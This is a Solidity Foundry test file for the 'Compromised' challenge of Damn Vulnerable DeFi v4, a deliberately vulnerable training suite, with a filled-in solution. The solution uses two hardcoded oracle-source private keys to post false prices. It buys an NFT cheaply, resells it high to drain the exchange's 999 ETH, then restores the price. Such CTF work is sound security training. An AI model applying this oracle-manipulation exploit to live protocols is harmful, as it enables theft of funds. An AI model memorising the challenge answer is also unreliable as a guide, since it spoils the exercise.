// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

contract CompromisedChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;


    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];
    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;

    modifier checkSolved() {
        _;
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);

        // Initialize balance of the trusted source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Player starts with limited balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the oracle and setup the trusted sources with initial prices
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
        nft = exchange.token();

        vm.stopPrank();
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_assertInitialState() public view {
        for (uint256 i = 0; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(nft.owner(), address(0)); // ownership renounced
        assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_compromised() public checkSolved {
    // Private Key 1: 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
    // Private Key 1 as uint: 56577504866754402476704710671607998097788127737820622057176835216156765075268
    // Address 1: 0x188Ea627E3531Db590e6f1D71ED83628d1933088
    address compromised_1 = vm.addr(56577504866754402476704710671607998097788127737820622057176835216156765075268);
    // Private Key 2: 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
    // Private Key 2 as uint: 47374484443060665555632190194785390295237856218300174632200062813742225441113
    // Address 2: 0xA417D473c40a4d42BAd35f147c21eEa7973539D8
    address compromised_2 = vm.addr(47374484443060665555632190194785390295237856218300174632200062813742225441113);

    // Drop the price
    vm.stopPrank();
    vm.prank(compromised_1);
    oracle.postPrice("DVNFT", PLAYER_INITIAL_ETH_BALANCE);
    vm.prank(compromised_2);
    oracle.postPrice("DVNFT", PLAYER_INITIAL_ETH_BALANCE);
    vm.startPrank(player);

    // Buy the NFT
    uint256 tokenId = exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();

    // Bump the price
    vm.stopPrank();
    vm.prank(compromised_1);
    oracle.postPrice("DVNFT", INITIAL_NFT_PRICE + PLAYER_INITIAL_ETH_BALANCE);
    vm.prank(compromised_2);
    oracle.postPrice("DVNFT", INITIAL_NFT_PRICE + PLAYER_INITIAL_ETH_BALANCE);
    vm.startPrank(player);

    // Sell the NFT
    exchange.token().approve(address(exchange), tokenId);
    exchange.sellOne(tokenId);

    // Send eth to recovery
    (bool r, ) = recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
    vm.assertTrue(r);
    
    // Normalize the price
    vm.stopPrank();
    vm.prank(compromised_1);
    oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
    vm.prank(compromised_2);
    oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
    vm.startPrank(player);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Exchange doesn't have ETH anymore
        assertEq(address(exchange).balance, 0);

        // ETH was deposited into the recovery account
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(nft.balanceOf(player), 0);

        // NFT price didn't change
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
